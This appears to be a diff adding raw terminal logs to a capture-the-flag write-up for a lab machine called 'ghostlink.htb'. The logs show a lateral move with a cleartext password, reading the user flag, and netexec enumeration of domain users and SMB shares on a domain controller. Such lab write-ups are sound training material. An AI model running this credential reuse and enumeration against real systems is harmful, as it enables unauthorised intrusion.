@@ -951,16 +951,61 @@ sha256:10000:RFczWWR4UHkyNQ==:jZs6AcOgJgs52wEa7R2/I5uLGyivYUHyiqAdOzq4/9RAi8W5Bl
 ---
 ## User Flag
 
-### Lateral Movement (if applicable)
+```
+su nvirelli
+Password: u47YUclrDiwWxBheaSzI
+id
+uid=1001(nvirelli) gid=1001(nvirelli) groups=1001(nvirelli)
+/bin/bash -p
+id
+uid=1001(nvirelli) gid=1001(nvirelli) groups=1001(nvirelli)
+which python3
+ls 
+link
+cd /home/nvirelli
+cat user.txt
+3757972b50096951cd82879c0bf788f8
+^C
 
-Steps to move from initial foothold to user access.
+```
 
 ---
 ## Privilege Escalation
 
 ### Enumeration
 
-What you found that leads to root/admin.
+```
+nxc smb ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI' --users
+SMB         10.129.191.32   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.191.32   445    DC01             [+] ghostlink.htb\nvirelli:u47YUclrDiwWxBheaSzI 
+SMB         10.129.191.32   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.191.32   445    DC01             Administrator                 2026-04-10 04:34:52 0       Built-in account for administering the computer/domain 
+SMB         10.129.191.32   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB         10.129.191.32   445    DC01             krbtgt                        2026-02-24 00:14:01 0       Key Distribution Center Service Account 
+SMB         10.129.191.32   445    DC01             nvirelli                      2026-03-03 20:35:06 0       Identity and federation specialist 
+SMB         10.129.191.32   445    DC01             kdraven                       2026-02-24 00:18:33 0       Defensive intelligence 
+SMB         10.129.191.32   445    DC01             zkovacs                       2026-02-24 00:18:34 0       Cryptography and signing workflows 
+SMB         10.129.191.32   445    DC01             ohexley                       2026-02-24 00:18:34 0       Binary analysis and reverse engineering 
+SMB         10.129.191.32   445    DC01             vroth                         2026-02-24 00:18:34 0       Automation and script development 
+SMB         10.129.191.32   445    DC01             dsoren                        2026-02-24 00:18:34 0       Digital forensics and incident response 
+SMB         10.129.191.32   445    DC01             lnoctis                       2026-02-24 00:18:34 0       Open source intelligence 
+SMB         10.129.191.32   445    DC01             svc_canary                    2026-02-24 14:37:09 0       Healthcheck Canary for Anika Jensen 
+SMB         10.129.191.32   445    DC01             [*] Enumerated 11 local users: GHOSTLINK
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/tools/creds/GogsToHashcat]
+└─$ nxc smb ghostlink.htb -u nvirelli -p 'u47YUclrDiwWxBheaSzI' --shares
+SMB         10.129.191.32   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.191.32   445    DC01             [+] ghostlink.htb\nvirelli:u47YUclrDiwWxBheaSzI 
+SMB         10.129.191.32   445    DC01             [*] Enumerated shares
+SMB         10.129.191.32   445    DC01             Share           Permissions     Remark
+SMB         10.129.191.32   445    DC01             -----           -----------     ------
+SMB         10.129.191.32   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.191.32   445    DC01             C$                              Default share
+SMB         10.129.191.32   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.191.32   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.191.32   445    DC01             SYSVOL          READ            Logon server share 
+
+```
 
 ### Exploitation
 
